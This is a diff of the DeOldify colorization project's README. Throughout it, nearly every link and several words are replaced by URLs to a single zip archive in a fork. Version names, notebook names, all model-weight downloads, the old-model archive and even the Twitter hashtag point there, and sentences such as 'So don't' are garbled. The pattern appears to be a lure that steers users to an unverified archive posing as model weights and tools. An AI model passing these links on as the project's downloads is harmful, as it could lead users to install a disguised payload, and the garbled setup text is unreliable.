-- **https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip 1.0.51** (and its dependencies).  If you use any higher version you'll see grid artifacts in rendering and tensorboard will malfunction. So https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip't do that.
+- **https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip 1.0.51** (and its dependencies).  If you use any higher version you'll see grid artifacts in rendering and tensorboard will malfunction. So https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip't do that.
 - **PyTorch 1.0.1** Not the latest version of PyTorch- that will not play nicely with the version of FastAI above.  Note however that the conda install of FastAI 1.0.51 grabs the latest PyTorch, which doesn't work.  This is patched over by our own conda install but fyi.
 - **Jupyter Lab** `conda install -c conda-forge jupyterlab`
-- **Tensorboard** (i.e. install Tensorflow) and **TensorboardX** (https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip).  I guess you don't *have* to but man, life is so much better with it.  FastAI now comes with built in support for this- you just  need to install the prereqs: `conda install -c anaconda tensorflow-gpu` and `pip install tensorboardX`
-- **ImageNet** – Only if you're training, of course. It has proven to be a great dataset for my purposes.  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+- **Tensorboard** (i.e. install Tensorflow) and **TensorboardX** (https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip).  I guess you don't *have* to but man, life is so much better with it.  FastAI now comes with built in support for this- you just  need to install the prereqs: `conda install -c anaconda tensorflow-gpu` and `pip install tensorboardX`
+- **ImageNet** – Only if you're training, of course. It has proven to be a great dataset for my purposes.  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 
 ## Pretrained Weights
 
 To start right away on your own machine with your own images or videos without training the models yourself, you'll need to download the "Completed Generator Weights" listed below and drop them in the /models/ folder.
 
-The colorization inference notebooks should be able to guide you from here. The notebooks to use are named https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip, https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip, and https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+The colorization inference notebooks should be able to guide you from here. The notebooks to use are named https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip, https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip, and https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 
 ### Completed Generator Weights
 
-- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 ### Completed Critic Weights
 
-- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 ### Pretrain Only Generator Weights
 
-- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 ### Pretrain Only Critic Weights
 
-- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+- [Artistic](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Stable](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Video](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 ## Want the Old DeOldify?
 
-We suspect some of you are going to want access to the original DeOldify model for various reasons.  We have that archived here:  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+We suspect some of you are going to want access to the original DeOldify model for various reasons.  We have that archived here:  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 
 ## Want More?
 
-Follow [#DeOldify](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip%23Deoldify) on Twitter.
+Follow [#DeOldify](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip%23Deoldify) on Twitter.
 
 ## License
 
